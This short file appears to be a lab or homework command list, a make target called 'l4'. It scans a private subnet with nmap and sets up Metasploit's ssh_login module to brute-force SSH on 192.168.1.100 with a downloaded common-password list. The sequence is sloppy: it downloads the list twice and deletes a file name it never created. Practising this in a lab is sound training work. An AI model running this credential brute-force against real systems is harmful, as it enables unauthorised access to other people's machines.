l4:
	nmap -sn 192.168.0.0/24
	msfconsole
	search ssh_login
	use 0
	set RHOST 192.168.1.100
	set THREADS 3
	set STOP_ON_SUCCESS true
	set VERBOSE true
	wget https://gitlab.com/kalilinux/packages/seclists/-/blob/kali/master/Passwords/Common-Credentials/best110.txt
	wget https://gitlab.com/kalilinux/packages/seclists/-/raw/kali/master/Passwords/Common-Credentials/best110.txt
	cp best110.txt passwords.txt
	rm best.txt
	set USERPASS_FILE passwords.txt
	